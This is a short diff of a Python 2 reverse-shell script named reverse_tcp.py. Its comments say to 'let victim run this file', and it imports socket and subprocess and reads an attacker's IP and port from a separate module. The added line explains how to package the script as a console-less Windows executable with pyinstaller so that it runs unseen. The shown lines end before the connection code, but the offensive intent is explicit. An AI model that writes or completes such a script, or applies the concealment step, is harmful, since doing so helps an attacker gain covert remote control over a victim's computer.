@@ -1,6 +1,7 @@
 #/usr/bin/env python
 ### Use python 2
 ### let victim run this file
+### To convert this file to windows exe, use "pyinstaller" and run "pyinstaller --noconsole --onefile reverse_tcp.py"
 import socket, subprocess, attacker_info, os
 attacker_ip = attacker_info.attacker_ip      ## attacker's ip
 attacker_port = attacker_info.attacker_port  ## attacker's port
